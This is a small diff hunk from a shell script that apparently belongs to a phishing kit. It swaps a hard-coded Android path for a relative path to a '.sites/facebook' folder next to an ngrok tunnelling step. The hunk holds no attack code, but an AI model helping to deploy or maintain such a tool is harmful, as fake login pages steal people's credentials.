@@ -121,7 +121,7 @@ case $OP in
 cd .sites/facebook
 local
 ngrok
-cd /sdcard/sukhdevr898/Project/loction/.sites/facebook
+cd joker/.sites/facebook
  
 while true;
 
